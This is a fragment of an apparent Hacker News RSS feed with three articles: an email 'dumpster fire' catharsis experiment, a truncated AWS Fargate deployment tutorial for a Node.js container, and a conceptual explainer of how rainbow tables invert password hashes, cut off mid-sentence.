<![CDATA[Email a Dumpster Fire]]>
            </title>
            <description>
<![CDATA[
Score 920 | Comments 249 (<a href="https://news.ycombinator.com/item?id=25201798">thread link</a>) | @bschne
<br/>
November 24, 2020 | https://hey.science/dumpster-fire/ | <a href="https://web.archive.org/web/*/https://hey.science/dumpster-fire/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>What's this experiment all about?</p>
    <p>Well, 2020's been a rough year. An absolute dumpster fire of a year for a lot of people.</p>
    <p>That's when it came to us. Can email be a conduit for catharsis? If you could type out an email, press send, and see it being consumed in an actual dumpster fire, would it help reclaim a little bit of what we've lost?</p>
    <p>Let's find out.</p>
    <p>P.S. We'll only use your email address to notify you about your burn. That's it, the end.</p>
    <p>P.P.S. We're offsetting by 3x every bit of CO2 this creates via <a href="https://www.cooleffect.org/content/project/native-alaskans-saving-lands" target="_blank" rel="noopener nofollow">Cool Effect</a>.</p>
  </div></div>]]>
            </description>
            <link>https://hey.science/dumpster-fire/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201798</guid>
            <pubDate>Tue, 24 Nov 2020 19:04:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hello World Node.js Deployed to AWS Fargate with Auto-Scaling]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25201748">thread link</a>) | @yamoriyamori
<br/>
November 24, 2020 | https://matthewkindzerske.com/2020/11/19/node-js-web-app-deployed-to-aws-fargate-w-auto-scaling/ | <a href="https://web.archive.org/web/*/https://matthewkindzerske.com/2020/11/19/node-js-web-app-deployed-to-aws-fargate-w-auto-scaling/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-171">
	<!-- .entry-header -->

	
		<div>
			
<p><strong>TL/DR:</strong> I present a detailed how-to for deploying a (hello world) Node.js web application (in container image form) onto <a href="https://aws.amazon.com/about-aws/whats-new/2017/11/introducing-aws-fargate-a-technology-to-run-containers-without-managing-infrastructure/">AWS Fargate</a> with auto-scaling.  This could be useful for the start of your project and then add subsequent layers for your purposes, or bits and pieces of this how-to could help solve a particular problem you’re facing.</p>



<h2>Motivation and Background</h2>



<p>It is not enough to be able to write software.&nbsp; One must also be able to deploy.&nbsp; I’m reminded of the Steve Jobs quote, <a href="https://www.creativethinkinghub.com/steve-jobs-was-right-real-artists-ship/">“real artists ship.”</a>&nbsp; Even if you wrote the next killer social media website, it means nothing unless you can get it out the door, hosted, and in a stable (and scalable!) production environment.&nbsp; This post is an extracted walk-through of how I used the new AWS service Fargate to host a side project.</p>



<p>What is <a href="https://aws.amazon.com/fargate/">Fargate</a>?&nbsp; It’s a generalized container orchestration service.&nbsp; “Generalized” here means that AWS has taken care of the underlying infrastructure usually associated with the creation of a ‘cluster’ (<a href="https://thenewstack.io/aws-fargate-through-the-lens-of-kubernetes/">in the kubernetes sense</a>) of computing resources.&nbsp; Bring your own container (the portable form of your application) and through configuration in the AWS console the application can be deployed into an auto scaling cluster, with integrations for Application Load Balancing, Certificate Management (ACM) for HTTPS, and DNS (Route 53).&nbsp; And what’s really nice is the container can be given an IAM role to call other authorized AWS Services.</p>



<p>Here’s the user story for this article, to help bridge the developer and product owner / business gap:</p>



<blockquote><p><strong>As an</strong> application/DevOps engineer, <strong>I want</strong> to deploy my containerized application to an orchestration service (AWS Fargate), <strong>so that</strong> I can avoid the headaches and complexity of provisioning low level services (networking, virtual machines, kubernetes) and also gain auto scalability for my production/other environment.</p><cite>– an application/DevOps engineer</cite></blockquote>



<h2>The Big Picture</h2>



<p>From the Node.js source all the way to a live app, here’s how the pieces fit together in one picture.  (The draw.io file is included in <a href="https://github.com/yamori/nodejs_hello_world_dockered">my github repo</a>.)</p>



<figure><img data-attachment-id="225" data-permalink="https://matthewkindzerske.com/big-picture-fargate-demo/" data-orig-file="https://matthewkindzerske.files.wordpress.com/2020/11/big-picture-fargate-demo.png" data-orig-size="809,469" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="big-picture-fargate-demo" data-image-description="" data-medium-file="https://matthewkindzerske.files.wordpress.com/2020/11/big-picture-fargate-demo.png?w=300" data-large-file="https://matthewkindzerske.files.wordpress.com/2020/11/big-picture-fargate-demo.png?w=636" src="https://matthewkindzerske.files.wordpress.com/2020/11/big-picture-fargate-demo.png?w=809" alt="" srcset="https://matthewkindzerske.files.wordpress.com/2020/11/big-picture-fargate-demo.png 809w, https://matthewkindzerske.files.wordpress.com/2020/11/big-picture-fargate-demo.png?w=150 150w, https://matthewkindzerske.files.wordpress.com/2020/11/big-picture-fargate-demo.png?w=300 300w, https://matthewkindzerske.files.wordpress.com/2020/11/big-picture-fargate-demo.png?w=768 768w" sizes="(max-width: 809px) 100vw, 809px"><figcaption>Fig. 1: Node.js app, Image Repository, Fargate, &amp; ALB</figcaption></figure>



<h2>Node.JS Web App</h2>



<p>A very basic ‘hello world’ app can be pulled from <a href="https://github.com/yamori/nodejs_hello_world_dockered">my github repo</a>:</p>



<pre><code>git clone \
https://github.com/yamor/nodejs_hello_world_dockered.git &amp;&amp; \
cd nodejs_hello_world_dockered &amp;&amp; \
npm install

# Give it a go and run
npm start
# ... then access at localhost:3000</code></pre>



<figure><img data-attachment-id="229" data-permalink="https://matthewkindzerske.com/screen-shot-2020-11-18-at-3-27-44-pm/" data-orig-file="https://matthewkindzerske.files.wordpress.com/2020/11/screen-shot-2020-11-18-at-3.27.44-pm.png" data-orig-size="619,253" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screen-shot-2020-11-18-at-3.27.44-pm" data-image-description="" data-medium-file="https://matthewkindzerske.files.wordpress.com/2020/11/screen-shot-2020-11-18-at-3.27.44-pm.png?w=300" data-large-file="https://matthewkindzerske.files.wordpress.com/2020/11/screen-shot-2020-11-18-at-3.27.44-pm.png?w=619" src="https://matthewkindzerske.files.wordpress.com/2020/11/screen-shot-2020-11-18-at-3.27.44-pm.png?w=619" alt="" srcset="https://matthewkindzerske.files.wordpress.com/2020/11/screen-shot-2020-11-18-at-3.27.44-pm.png 619w, https://matthewkindzerske.files.wordpress.com/2020/11/screen-shot-2020-11-18-at-3.27.44-pm.png?w=150 150w, https://matthewkindzerske.files.wordpress.com/2020/11/screen-shot-2020-11-18-at-3.27.44-pm.png?w=300 300w" sizes="(max-width: 619px) 100vw, 619px"><figcaption>Fig. 2: Node.js application up and running</figcaption></figure>



<p>It’s a very basic application:</p>



<ul><li>Built from <code>npx express-generator</code></li><li>Changed the <code>routes/index.js </code>‘title’ variable to ‘nodejs_hello_world_dockered’</li><li>Added a <code>Dockerfile</code>, which we’ll walk through now…</li></ul>



<h2>Dockerfile</h2>



<pre><code>$ cat Dockerfile 
 FROM node:12.18.2-alpine3.9
 WORKDIR /usr/app
 COPY . .
 RUN npm install --quiet
 RUN npm install pm2 -g
 EXPOSE 3000
 CMD ["pm2-runtime", "start", "./bin/www", "--name", "nodejs_hello_world_dockered"]</code></pre>



<p>Some explanation:</p>



<ul><li>The <code>COPY</code> command is copying all the Node.js source into the container</li><li><code><a href="https://pm2.keymetrics.io/">pm2</a></code> is installed for process management, reload capabilities, and it’s nice for production purposes adding a layer on top of the core Node.js code, and not necessary for small development efforts.&nbsp; But importantly, the container is using <code>pm2-runtime</code> which <a href="https://stackoverflow.com/questions/53962776/whats-the-difference-between-pm2-and-pm2-runtime">is needed to keep a container alive</a>.</li></ul>



<h2>Docker Commands</h2>



<p><strong>Assumption</strong>: docker is installed and running.</p>



<pre><code>$ docker -v
Docker version 19.03.6-ce, build 369ce74</code></pre>



<p>Docker build, run then a <code>curl</code> to test.</p>



<pre><code><code># this command builds the image that is ultimately 
# deployed to fargate</code>
docker build -t nodejs_hello_world_dockered . 

docker run -d -p 3000:3000 nodejs_hello_world_dockered

$ curl localhost:3000
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;nodejs_hello_world_dockered&lt;/title&gt;&lt;link rel="stylesheet" href="/stylesheets/style.css"&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;nodejs_hello_world_dockered&lt;/h1&gt;&lt;p&gt;Welcome to nodejs_hello_world_dockered&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>



<p>When done, kill the running container but keep the image.</p>



<pre><code><code># kills all running containers</code>
docker container kill $(docker ps -q)

<code># you should see our nodejs_hello_world_dockered</code>
docker images</code></pre>



<h2>Push the Image to a Container Registry</h2>



<p><strong>Tip</strong>: Use an EC2 or Devops/pipeline within AWS (and not your local machine) for image building and pushing, as uploads from a slow or residential network can take a long time.&nbsp; Take proximity into account for your approach/strategy for large data movements.  This tip should have preceded the Docker section above, but the rationale might not have become apparent until you attempt to push an image to a registry and find that it’s way too slow.</p>



<p><strong>Assumption</strong>: the AWS CLI is installed and has an account with appropriate authorizations.</p>



<pre><code>$ aws --v
 aws-cli/1.16.30 ...</code></pre>



<p><strong>Assumption</strong>: you have an ECR repository <a href="https://docs.aws.amazon.com/AmazonECR/latest/userguide/repository-create.html">created</a>.</p>



<p>Now to push and it’s just two commands (but preceded by an AWS ECR login), to label the image then upload it.&nbsp; Notice the label contains the repositories address.</p>



<pre><code>aws ecr get-login --no-include-email --region us-east-1 \
| /bin/bash

docker tag nodejs_hello_world_dockered:latest \
1234567890.dkr.ecr.us-east-1.amazonaws.com/fargate_demo:latest

docker push \
1234567890.dkr.ecr.us-east-1.amazonaws.com/fargate_demo:latest</code></pre>



<h2>AWS &amp; Fargate</h2>



<p>Congratulations, at this point the application is in a nice and portable (container) format and residing in an AWS ECR repository.&nbsp; The Fargate configuration will consist of the following:</p>



<ul><li><strong>Task</strong>: defines the container configuration</li><li><strong>Cluster</strong>: regional grouping of computing resource</li><li><strong>Service</strong>: a scheduler which maintains the running Task(s) within the Cluster…<ul><li>Auto-scaling will be configured at this level of the stack and will scale up the number of Tasks as configured</li></ul></li></ul>



<p>The remaining AWS service is a Load Balancer which is separate from Fargate.  It will be described later as it exposes the application to the greater web.</p>



<h2>Task Definition</h2>



<p>Access the AWS Console &gt; (ECS) Elastic Container Service &gt; (left side menu) Task Definitions &gt; click ‘Create new Task Definition’.  On the next screen click ‘Fargate’ and then ‘Next Step’.</p>



<figure><img data-attachment-id="192" data-permalink="https://matthewkindzerske.com/004/" data-orig-file="https://matthewkindzerske.files.wordpress.com/2020/11/004.png" data-orig-size="887,499" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="004" data-image-description="" data-medium-file="https://matthewkindzerske.files.wordpress.com/2020/11/004.png?w=300" data-large-file="https://matthewkindzerske.files.wordpress.com/2020/11/004.png?w=636" src="https://matthewkindzerske.files.wordpress.com/2020/11/004.png?w=887" alt="" srcset="https://matthewkindzerske.files.wordpress.com/2020/11/004.png 887w, https://matthewkindzerske.files.wordpress.com/2020/11/004.png?w=150 150w, https://matthewkindzerske.files.wordpress.com/2020/11/004.png?w=300 300w, https://matthewkindzerske.files.wordpress.com/2020/11/004.png?w=768 768w" sizes="(max-width: 887px) 100vw, 887px"><figcaption>Fig. 3: Fargate launch types</figcaption></figure>



<p>On the next screen, fill in the following:</p>



<ul><li><strong>Name</strong>: I have called it ‘fargate-demo-task-definition’</li><li><strong>Task Role</strong>: this can be left as ‘none’, but I can’t stress enough how versatile this is.&nbsp; If your Node.js app needs to make call to DynamoDB, Simple Email Service, or any other Amazon service, you can enable it here.&nbsp; Using the node package <code><a href="https://www.npmjs.com/package/aws-sdk">aws-sdk</a></code> will <a href="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html">automagically</a> query a resource URI at runtime to gain credentials, thus granting authorizations to your app for the role specified.&nbsp; This is very cool.</li><li><strong>Task Execution IAM Role</strong>: leave as the default ‘ecsTaskExecutionRole’, see the image below for the succinct AWS explanation</li><li><strong>Task Size</strong>: this provides a lot of room for tuning, but for this simple Node.js app I’ve plugged in 0.5GB and 0.25CPU respectively for memory and CPU allocation.</li><li>Add Container:<ul><li><strong>Container Name</strong>: I have called it ‘fargate-demo-container-image’</li><li><strong>Image</strong>: Use the image URI from the end of the ‘Upload to Container Registry Section’ which was of the form ‘1234567890.dkr.ecr.us-east-1.amazonaws.com/fargate_demo:latest’</li><li><strong>Memory Limits</strong>: AWS recommends 300MiB to start for web apps.</li><li><strong>Port Mappings</strong>: 3000, for the container port exposing the Node.js application.</li><li>…then click ‘Add’.</li></ul></li><li><strong>Tags</strong>: always try to tag your AWS resources.</li><li>…then click ‘Create’.</li></ul>



<h2>Cluster</h2>



<p>Access AWS ECS and click ‘Create Cluster’.</p>



<figure><img data-attachment-id="195" data-permalink="https://matthewkindzerske.com/001/" data-orig-file="https://matthewkindzerske.files.wordpress.com/2020/11/001.png" data-orig-size="1037,206" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="001" data-image-description="" data-medium-file="https://matthewkindzerske.files.wordpress.com/2020/11/001.png?w=300" data-large-file="https://matthewkindzerske.files.wordpress.com/2020/11/001.png?w=636" src="https://matthewkindzerske.files.wordpress.com/2020/11/001.png?w=1024" alt="" srcset="https://matthewkindzerske.files.wordpress.com/2020/11/001.png?w=1024 1024w, https://matthewkindzerske.files.wordpress.com/2020/11/001.png?w=150 150w, https://matthewkindzerske.files.wordpress.com/2020/11/001.png?w=300 300w, https://matthewkindzerske.files.wordpress.com/2020/11/001.png?w=768 768w, https://matthewkindzerske.files.wordpress.com/2020/11/001.png 1037w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Fig. 4: Cluster creation</figcaption></figure>



<p>There are a lot of different configurations for computing resources, networking, and scaling but we’ll stick with the simple case and select Networking Only.</p>



<figure><img data-attachment-id="197" data-permalink="https://matthewkindzerske.com/002/" data-orig-file="https://matthewkindzerske.files.wordpress.com/2020/11/002.png" data-orig-size="675,630" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="002" data-image-description="" data-medium-file="https://matthewkindzerske.files.wordpress.com/2020/11/002.png?w=300" data-large-file="https://matthewkindzerske.files.wordpress.com/2020/11/002.png?w=636" src="https://matthewkindzerske.files.wordpress.com/2020/11/002.png?w=675" alt="" srcset="https://matthewkindzerske.files.wordpress.com/2020/11/002.png 675w, https://matthewkindzerske.files.wordpress.com/2020/11/002.png?w=150 150w, https://matthewkindzerske.files.wordpress.com/2020/11/002.png?w=300 300w" sizes="(max-width: 675px) 100vw, 675px"><figcaption>Fig. 5: Cluster templates</figcaption></figure>



<p>On the next screen, give it a name such as ‘fargate-demo-cluster’.&nbsp; Leave the ‘Create VPC’ unchecked as we can use the default one but if you’re deploying an intensive app you may want a dedicated VPC.&nbsp; Add any tags.&nbsp; (I highly recommend adding tags so you can quickly search and find associated resources for your projects.)</p>



<h2>ALB – Application Load Balancer</h2>



<p>Access the ALB service and click ‘Create’: EC2 &gt; (left side menu) Load Balancers &gt; ‘Create’ &gt; (Application Load Balancer / HTTP / HTTPS) ‘Create’.</p>



<p>On the next configuration screen, make the following changes:</p>



<ul><li><strong>Name</strong>: I have called it ‘fargate-demo-ALB’</li><li><strong>Listeners</strong>: for now we’ll keep HTTP port 80, though this target group will be deleted eventually.&nbsp; (The ALB creation wizard requires at least one target group.)<ul><li>(Not included in this article, but once the entire system is up it’s easy to add a second listener for HTTPS port 443 while also including a certificate from <a href="https://aws.amazon.com/certificate-manager/">ACM</a>.)</li></ul></li><li><strong>Availability Zones</strong>: choose the intended VPC and select multiple subnets which will eventually become contain the targets for this ALB</li></ul>



<p>Click ‘Next: Configure Security Groups’, though an intermediary page will warn about the absence of a ‘secure listener’.&nbsp; We’ll click through this for now, but as mentioned above a 443 listener can be added in the future (but not part of this article).</p>



<p>On the next page, we’ll ‘Create New Security Group’ and call it ‘fargate-demo-security-group’.&nbsp; Leave the default TCP port of 80, and notice that it’s open to any IP source (0.0.0.0/0, ::/0).&nbsp; Then click ‘Next: Configure Routing’.</p>



<p>On this next page, give the target group a name (fargate-demo-target-group).&nbsp; In the screengrab below, it’s important to understand that the ALB will regularly check for the application providing an <a href="https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#2xx_success">HTTP status code</a> 200 at the specified path.&nbsp; The Node.js app was created to offer a basic response on the root path so the following configuration is fine.</p>



<figure><img data-attachment-id="202" data-permalink="https://matthewkindzerske.com/003/" data-orig-file="https://matthewkindzerske.files.wordpress.com/2020/11/003.png" data-orig-size="575,395" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="003" data-image-description="" data-medium-file="https://matthewkindzerske.files.wordpress.com/2020/11/003.png?w=300" data-large-file="https://matthewkindzerske.files.wordpress.com/2020/11/003.png?w=575" src="https://matthewkindzerske.files.wordpress.com/2020/11/003.png?w=575" alt="" srcset="https://matthewkindzerske.files.wordpress.com/2020/11/003.png 575w, https://matthewkindzerske.files.wordpress.com/2020/11/003.png?w=150 150w, https://matthewkindzerske.files.wordpress.com/2020/11/003.png?w=300 300w" sizes="(max-width: 575px) 100vw, 575px"><figcaption>Fig. 6: ALB health checks</figcaption></figure>



<p>Click ‘Next: Register Targets’, but we’ll skip that page and click ‘Next: Review’ then ‘Create’!</p>



<h2>Service</h2>



<p>The Fargate Service will provide an instance of the Task Definition to be run in the Cluster.&nbsp; Navigate to AWS Console &gt; ECS &gt; (left side menu) Clusters &gt; then click on the Cluster we created “fargate-demo-cluster”.&nbsp; And at the bottom of the screen will be a tag for ‘Services’, click the button ‘Create’.</p>



<figure><img data-attachment-id="204" data-permalink="https://matthewkindzerske.com/007/" data-orig-file="https://matthewkindzerske.files.wordpress.com/2020/11/007.png" data-orig-size="639,258" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="007" data-image-description="" data-medium-file="https://matthewkindzerske.files.wordpress.com/2020/11/007.png?w=300" data-large-file="https://matthewkindzerske.files.wordpress.com/2020/11/007.png?w=636" src="https://matthewkindzerske.files.wordpress.com/2020/11/007.png?w=639" alt="" srcset="https://matthewkindzerske.files.wordpress.com/2020/11/007.png 639w, https://matthewkindzerske.files.wordpress.com/2020/11/007.png?w=150 150w, https://matthewkindzerske.files.wordpress.com/2020/11/007.png?w=300 300w" sizes="(max-width: 639px) 100vw, 639px"><figcaption>Fig…</figcaption></figure></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://matthewkindzerske.com/2020/11/19/node-js-web-app-deployed-to-aws-fargate-w-auto-scaling/">https://matthewkindzerske.com/2020/11/19/node-js-web-app-deployed-to-aws-fargate-w-auto-scaling/</a></em></p>]]>
            </description>
            <link>https://matthewkindzerske.com/2020/11/19/node-js-web-app-deployed-to-aws-fargate-w-auto-scaling/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201748</guid>
            <pubDate>Tue, 24 Nov 2020 19:01:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Rainbow Tables Work]]>
            </title>
            <description>
<![CDATA[
Score 104 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25201513">thread link</a>) | @susam
<br/>
November 24, 2020 | http://kestas.kuliukas.com/RainbowTables/ | <a href="https://web.archive.org/web/*/http://kestas.kuliukas.com/RainbowTables/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><h6><a href="http://kestas.kuliukas.com/">kestas.kuliukas.com</a></h6>
<h3>How Rainbow Tables work</h3>
<p>I found the creator of Rainbow Table's paper, aimed at cryptanalysts,
was pretty inaccessible considering the simplicity and elegance of
Rainbow Tables, so this is an overview of it for a layman.</p>

<hr>

<p>Hash functions map plaintext to hashes so that you can't tell a
plaintext from its hash.<br>
</p><center><img src="http://kestas.kuliukas.com/RainbowTables/1.png"></center>

<p>If you want to find a given plaintext for a certain hash there are two
simple methods:<br>
- Hash each plaintext one by one, until you find the hash.<br>
- Hash each plaintext one by one, but store each generated hash in a
sorted table so that you can easily look the hash up later without
generating the hashes again</p>

<p>Going one by one takes a very long time, and storing each hash takes an
amount of memory which simply doesn't exist (for all but the smallest of
plaintext sets). Rainbow tables are a compromise between pre-computation
and low memory usage.</p>

<p>The key to understanding rainbow tables is understanding the
(unhelpfully named) reduction function.<br>
A hash function maps plaintexts to hashes, the reduction function maps
hashes to plaintexts.<br>
</p><center><img src="http://kestas.kuliukas.com/RainbowTables/2.png"></center>


<p>It's important to note that it does the reverse of a hash function
(mapping hashes to plaintexts), but it is /not/ an inverse hash
function. The whole purpose of hash functions is that inverse hash
functions can't be made. If you take the hash of a plaintext, and take
the reduction of the hash, it will not give you the original plaintext;
but some other plaintext.</p>

<p>If the set of plaintexts is [0123456789]{6} (we want a rainbow table of
all numeric passwords of length 6), and the hashing function is MD5(), a
hash of a plaintext might be MD5("493823") -&gt;
"222f00dc4b7f9131c89cff641d1a8c50".<br>
In this case the reduction function R() might be as simple as taking the
first six numbers from the hash; R("222f00dc4b7f9131c89cff641d1a8c50")
-&gt; "222004".<br>
We now have generated another plaintext from the hash of the previous
plaintext, this is the purpose of the reduction function.</p>


<p>Hashes are one-way functions, and so are reduction functions. The chains
which make up rainbow tables are chains of one way hash and reduction
functions starting at a certain plaintext, and ending at a certain hash.
A chain in a rainbow table starts with an arbitrary plaintext, hashes
it, reduces the hash to another plaintext, hashes the new plaintext, and
so on. The table only stores the starting plaintext, and the final hash
you choose to end with, and so a chain "containing" millions of hashes
can be represented with only a single starting plaintext, and a single
finishing hash.<br>
</p><center><img src="http://kestas.kuliukas.com/RainbowTables/3.png"></center>


<p>After generating many chains the table might look something like:<br>
iaisudhiu -&gt; 4259cc34599c530b1e4a8f225d665802<br>
oxcvioix -&gt; c744b1716cbf8d4dd0ff4ce31a177151<br>
9da8dasf -&gt; 3cd696a8571a843cda453a229d741843<br>
[...]<br>
sodifo8sf -&gt; 7ad7d6fa6bb4fd28ab98b3dd33261e8f</p>

<hr>

<p>The chains are now ready to be used. We have a certain hash with an
unknown plaintext, and we want to check to see whether it is inside any
of the generated chains.</p>

<p>The algorithm is:<br>
</p><ul><li>Look for the hash in the list of final hashes, if it is there break
out of the loop.</li>
<li>If it isn't there reduce the hash into another plaintext, and hash the
new plaintext.</li>
<li>Goto the start.</li>
<li>If the hash matches one of the final hashes, the chain for which the
hash matches the final hash contains the original hash.</li></ul>
You can now get that chain's starting plaintext, and start hashing and
reducing it, until you come to the known hash along with its secret
plaintext.

<p>In this way you check through the hashes in the chains, which aren't
actually stored anywhere on disk, by iterating column by column through
the table of chains, backwards from the last column in the chain, to the
starting plaintext.</p>

<hr>
<p>If you wanted to check whether the hash exists in the last column of any 
of the chains you reduce and hash the given hash once, then check the 
generated hash against the chain end hashes.
</p><center><img src="http://kestas.kuliukas.com/RainbowTables/a1.png"></center>

<p>You can check the second last column by reducing and hashing twice, 
then check the generated hash against the chain end hashes.
</p><center><img src="http://kestas.kuliukas.com/RainbowTables/a2.png"></center>

<p>And the third is checked by reducing and hashing three times, 
then check the generated hash against the chain end hashes.
</p><center><img src="http://kestas.kuliukas.com/RainbowTables/a3.png"></center>

<p>Supposing
a chain ending matches the generated hash the matching chain end might
contain the hash. The starting plaintext which was stored with the ending 
hash can be reduced and hashed until the correct plaintext is found within 
the chain.
</p><center><img src="http://kestas.kuliukas.com/RainbowTables/a4.png"></center>

<hr>

<p>Collisions are the only problem with Rainbow Tables. Ironically
collisions are seen as a bad thing for hashing algorithms, but in the
case of Rainbow Tables a hashing algorithm which generates collisions
fairly regularly will be more secure.<br>
</p><center><img src="http://kestas.kuliukas.com/RainbowTables/5.png"></center><br>
A given hash may be generated by multiple plaintexts (this is called a
collision), which is a big problem for chains because it causes chains
which start different to converge into one. Also you get loops, which
are caused when a hash is reduced to a plaintext that was hashed at a
previous point in the chain.<br>
<center><img src="http://kestas.kuliukas.com/RainbowTables/6.png"></center>


<p>Because of these collision problems there is no guarantee that there
will be a hash of a plaintext that will reduce to some other given
plaintext.<br>
If you have a simple list of hashes and corresponding plaintexts for
every plaintext in a set you will know that if you have not found the
hash in the generated hashes the plaintext that generated the hash is
not in the set.<br>
If you have a table of chains where the reduction function reduces
hashes into the set of plaintexts you could have trillions of chains
generated but you still may not have generated every plaintext in the
set you want to check. You can only say how probable it is that a table
of chains contains a certain plaintext, and this can approach 1 but will
probably never reach 1.<br>
If you have a rainbow table with 10 chains of length 100 you have hashed
1000 plaintexts, but even if there are only 100 plaintexts in the set of
desired plaintexts the 1000 hashes you have in the chains may not
contain all the desired hashes.</p>

<hr>

<p>The way collisions are handled is what sets Rainbow Tables apart from
its predecessor which was developed in 1980.</p>

<p>The predecessor solved the problem of certain plaintexts never being
reduced to by using many small tables. Each small table uses a different
reduction function. This doesn't solve the problem completely, but it
does help.<br>
To solve chain merges and loops each chain ended at a "distinct point";
a hash which was unique in some way, eg hashes where the first 4
characters are 0. The chains keep on going until it reaches a distinct
point. If two chains end up at the same distinct point then there has
been a collision somewhere in the chain, and one of the chains is
discarded. If a chain is generated for an unusually long time without
reaching a distinct point a loop is suspected (where a chain of hashes
ends up reducing and hashing to a previous hash in the chain).
The problem with this is that if there is a collision there is
potentially a whole branch which has to be cut off and won't make it
into the chains, and a loop will cause all the hashes which came before
the loop in the chain to be discarded.<br>
</p><center><img src="http://kestas.kuliukas.com/RainbowTables/7.png"></center><br>
Also all the time spend generating that chain will be wasted, and by
ending only at distinct points you have chains of variable length. This
means that you may have to keep checking for a hash within especially
long chains long after the other chains have ended.

<hr>

<p>Rainbow tables differ in that they don't use multiple tables with
different reduction functions, they only use one table. However in
Rainbow Tables a different reduction function is used for each column.
This way different tables with different reduction functions aren't
needed, because different reduction functions are used within the same
table. It is still unlikely that all plaintexts in the desired set will
be hashed, but the chances are higher for a given number of chains.
Chain merges are much, much rarer, because collisions have to occur on
the same column. For a chain of length l the chance of a collision
causing a merge is reduced to 1/l. Loops are also solved, because if a
hash in a chain is the same as a previous hash it won't reduce to the
same plaintext.</p>

<p>The reason they're called Rainbow Tables is because each column uses a
different reduction function. If each reduction function was a different
color, and you have starting plaintexts at the top and final hashes at
the bottom, it would look like a rainbow (a very vertically long and
thin one).<br>
By using Rainbow Tables the only problem that remains is that you can
never be certain that the chains contain all the desired hashes, to get
higher success rates from a given Rainbow Table you have to generate
more and more chains, and get diminishing returns.</p>


<hr>

<p>I hope by explaining the Rainbow Table I haven't made them any less 
wonderful ...</p>

<hr>

<a name="improving"></a>
<h4>An easy way to improve on the "rainbowcrack" Rainbow Tables implementation</h4>
<p>This section probably goes a bit beyond where a layman would be comfortable, 
but if you're interested in the practical applications of the above theory or have some 
interest in cryptography read on..</p>

<p>The rainbowcrack application is how most people come to learn 
